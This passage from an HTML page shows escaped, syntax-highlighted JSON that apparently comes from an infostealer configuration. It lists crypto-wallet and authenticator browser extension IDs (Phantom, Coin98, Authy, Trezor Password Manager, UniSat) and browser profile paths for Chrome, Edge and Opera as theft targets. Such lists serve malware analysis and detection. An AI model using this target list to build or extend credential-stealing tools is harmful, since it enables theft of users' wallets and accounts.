class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;KHC&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ookjlbkiijinhpmnjffcofjonbfbgaoc&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Temple&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;mnfifefkajgofkcjkemidiaecocnkjeh&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;TezBox&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;lodccjjbdhfakaekdiahmedfbieldgik&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;DAppPlay&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ijmpgkjfkbfhoebgogflfebnmejmfbm&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;BitClip&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;lkcjlnjfpbikmcmbachjpdbijejflpcm&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Steem Keychain&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;onofpnbbkehpmmoabgpcpmigafmmnjh&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Nash Extension&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;bcopgchhojmggmffilplmbdicgaihlkp&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Hycon Lite Client&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;klnaejjgbibmhlephnhpmaofohgkpgkd&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ZilPay&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;aeachknmefphepccionboohckonoeemg&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Coin98&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;bhghoamapcdpbohphigoooaddinpkbai&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Authenticator&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;dkdedlpgdmmkkfjabffeganieamfklkm&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Cyano&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;nlgbhdfgdhgbiamfdfmbikcdghidoadd&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Byone&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;infeboajgfhgbjpjbeppbkgnabfdkdaf&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;OneKey&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;cihmoadaighcejopammfbmddcmdekcje&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Leaf&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;gaedmjdfmmahhbjefcbgaolhhanlaolb&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Authy&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;oeljdldpnmdbchonielidgobddfffla&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;EOS Authenticator&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ilgcnhelpchnceeipipijaljkblbcob&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;GAuth Authenticator&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;imloifkgjagghnncjkhggdhalmcnfklk&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Trezor Password Manager&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;bfnaelmomeimhlpmgjnjophhpkkoljpa&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Phantom&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ppbibelpcjmhbdihakflkdcoccbgbkpo&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;UniSat&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;n&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;punctuation&#34;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%localappdata%\\Google\\Chrome\\User Data&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Chrome&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%localappdata%\\Chromium\\User Data&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Chromium&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%localappdata%\\Microsoft\\Edge\\User Data&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Edge&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%localappdata%\\Kometa\\User Data&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Kometa&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Opera Software\\Opera Stable&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span 